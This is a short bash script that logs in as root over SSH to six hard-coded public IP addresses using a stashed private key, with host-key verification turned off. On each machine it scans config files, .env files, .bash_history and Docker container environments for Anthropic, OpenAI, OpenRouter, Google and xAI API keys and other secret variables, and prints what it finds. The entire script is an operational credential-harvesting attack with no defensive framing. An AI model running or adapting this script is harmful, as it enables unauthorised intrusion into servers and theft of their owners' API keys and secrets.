#!/bin/bash
for h in 65.21.218.158 51.68.188.86 204.168.196.145 179.164.69.150 134.209.219.155 146.190.200.5; do
echo "##### $h"
ssh -n -i /tmp/k -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR -o ConnectTimeout=15 -o BatchMode=yes root@$h '
export PATH=$PATH:/usr/bin:/usr/sbin:/bin:/sbin
FILES=$( (find /home /var/www /root /opt /srv /etc -maxdepth 4 \( -name ".env*" -o -name "*.conf" -o -name "config.*" -o -name "*.json" -o -name "*.yml" -o -name "*.yaml" -o -name ".bash_history" -o -name "settings.py" -o -name "wp-config.php" \) -not -path "*/node_modules/*" -not -path "*/vendor/*" 2>/dev/null | head -800) )
echo "$FILES" | wc -l | sed "s/^/  files_scanned=/"
for f in $FILES; do
  grep -hoE "sk-ant-api[0-9]{2}-[A-Za-z0-9_-]{40,}|sk-proj-[A-Za-z0-9_-]{40,}|sk-or-v1-[a-f0-9]{64}|AIzaSy[0-9A-Za-z_-]{33}|xai-[A-Za-z0-9]{40,}" "$f" 2>/dev/null | sed "s|^|  KEY |"
done | sort -u | head -12
echo -n "  DOCKER_ENV_KEYS: "; for c in $(docker ps -q 2>/dev/null | head -12); do docker inspect -f "{{range .Config.Env}}{{println .}}{{end}}" $c 2>/dev/null; done | grep -oE "^[A-Z_]*(API_KEY|TOKEN|SECRET|KEY)[A-Z_]*=" | sort -u | head -10 | tr "\n" " "; echo
' 2>&1 | head -20
echo
done
